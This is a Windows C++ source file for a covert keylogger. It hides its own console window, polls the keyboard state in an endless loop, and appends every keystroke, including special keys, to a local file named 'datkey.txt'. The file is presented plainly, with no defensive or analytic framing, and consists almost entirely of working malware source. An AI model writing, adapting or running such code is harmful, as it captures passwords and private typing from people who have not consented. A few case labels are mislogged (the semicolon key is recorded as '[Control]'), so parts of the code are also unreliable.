#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("datkey.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << "[Space]";
		LOG("[Space]");
		return true;
	case VK_RETURN:
		cout << "\n [Enter]";
		LOG("\n [Enter]");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "[Shift]";
		LOG("[Shift]");
		return true;
	case VK_BACK:
		cout << "[Back]";
		LOG("[Back]");
		return true;
	case VK_RBUTTON:
		cout << "[RClick]";
		LOG("[RClick]");
		return true;
    case VK_TAB:
		cout << "[Tab]";
		LOG("[Tab]");
		return true;
    case VK_CAPITAL:
        cout << "[Caps Lock]";
        LOG("[Caps Lock]");
        return true;
    case VK_MENU:
        cout << "[Alt]";
        LOG("[Alt]");
        return true;
    case VK_RIGHT:
        cout << "[R-]";
        LOG("[R-]");
        return true;
    case VK_DELETE:
        cout << "[Del]";
        LOG("[Del]");
        return true;
    case VK_LEFT:
        cout << "[L-]";
        LOG("[L-]");
        return true;
    case VK_UP:
        cout << "[U-]";
        LOG("[U-]");
        return true;
    case VK_DOWN:
        cout << "[D-]";
        LOG("[D-]");
        return true;
     case VK_NUMPAD1:
        cout << "1";
        LOG("1");
        return true;
     case VK_NUMPAD2:
        cout << "2";
        LOG("2");
        return true;
     case VK_NUMPAD3:
        cout << "3";
        LOG("3");
        return true;
     case VK_NUMPAD4:
        cout << "4";
        LOG("4");
        return true;
     case VK_NUMPAD5:
        cout << "5";
        LOG("5");
        return true;
     case VK_NUMPAD6:
        cout << "6";
        LOG("6");
        return true;
     case VK_NUMPAD7:
        cout << "7";
        LOG("7");
        return true;
     case VK_NUMPAD8:
        cout << "8";
        LOG("8");
        return true;
     case VK_NUMPAD9:
        cout << "9";
        LOG("9");
        return true;
     case VK_NUMPAD0:
        cout << "0";
        LOG("0");
        return true;
    case VK_CANCEL:
        cout << "[Cancel]";
        LOG("[Cancel]");
        return true;
     case VK_CONTROL:
        cout << "[Control]";
        LOG("[Control]");
        return true;
     case VK_OEM_1:
        cout << "[: ;]";
        LOG("[Control]");
        return true;
     case VK_OEM_PLUS:
        cout << "[+]";
        LOG("[+]");
        return true;
     case VK_OEM_COMMA:
        cout << "[,]";
        LOG("[,]");
        return true;
     case VK_OEM_MINUS:
        cout << "[-]";
        LOG("[-]");
        return true;
      case VK_OEM_PERIOD:
        cout << "[.]";
        LOG("[.]");
        return true;
     case VK_F1:
        cout << "[F1]";
        LOG("[F1]");
        return true;
     case VK_F2:
        cout << "[F2]";
        LOG("[F2]");
        return true;
     case VK_F3:
        cout << "[F3]";
        LOG("[F3]");
        return true;
     case VK_F4:
        cout << "[F4]";
        LOG("[F4]");
        return true;
     case VK_F5:
        cout << "[F5]";
        LOG("[F5]");
        return true;
     case VK_F6:
        cout << "[F6]";
        LOG("[F6]");
        return true;
     case VK_F7:
        cout << "[F7]";
        LOG("[F7]");
        return true;
     case VK_F8:
        cout << "[F8]";
        LOG("[F8]");
        return true;
     case VK_F9:
        cout << "[F9]";
        LOG("[F9]");
        return true;
     case VK_F10:
        cout << "[F10]";
        LOG("[F10]");
        return true;
     case VK_F11:
        cout << "[F11]";
        LOG("[F11]");
        return true;
     case VK_F12:
        cout << "[F12]";
        LOG("[F12]");
        return true;
     case VK_OEM_2:
        cout << "[/ ?]";
        LOG("[/ ?]");
        return true;
     case VK_OEM_3:
        cout << "[` ~]";
        LOG("[` ~]");
        return true;
    case VK_OEM_4:
        cout << "[[ {";
        LOG("[[ {]");
        return true;
    case VK_OEM_5:
        cout << "[\\ |]";
        LOG("[\\ |]");
        return true;
    case VK_OEM_6:
        cout << "[] }]";
        LOG("[] }]");
        return true;
    case VK_OEM_7:
        cout << "[single-quote/double-quote]";
        LOG("[single-quote/double-quote]");
        return true;
    case VK_ESCAPE:
        cout << "[Esc]";
        LOG("[Esc]");
        return true;
    case VK_LWIN:
        cout << "[Win]";
        LOG("[Win]");
        return true;
    case VK_RWIN:
        cout << "[Win]";
        LOG("[Win]");
        return true;
    case VK_NUMLOCK:
        cout << "[Num Lock]";
        LOG("[Num Lock]");
        return true;
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
                    cout << char(KEY);
					fstream LogFile;
					LogFile.open("datkey.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}


